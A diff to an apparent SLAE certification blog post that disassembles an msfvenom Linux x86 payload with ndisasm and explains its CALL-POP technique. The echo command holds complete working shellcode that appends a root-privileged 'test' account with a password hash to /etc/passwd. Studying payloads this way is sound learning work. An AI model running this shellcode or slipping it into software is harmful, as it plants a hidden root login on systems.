@@ -424,5 +424,18 @@ User input passing , Lets see the opcode as well using ndiasm
   toor@ubuntu:/usr/include/i386-linux-gnu/sys$ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
 
 
-We have identified that in msfvenom ,  
-Analysing the opcode we can see that they are using CALL-JMP_POP format to put the userinput "whoami" onto the stack. user input "whoam" is passed using call dword 0x24
+   00000026  E822000000        call dword 0x4d                                           
+   0000002B  7465              jz 0x92
+   0000002D  7374              jnc 0xa3
+ 
+>>> "74657374".decode("hex")
+'test'
+ 
+Analysing the opcode we can see that they are using CALL-JMP_POP format to put the userinput "test" onto the stack. user input "test" is passed using call dword 0x4d
+
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE-1509
+
+arun.georg97@gmail.com
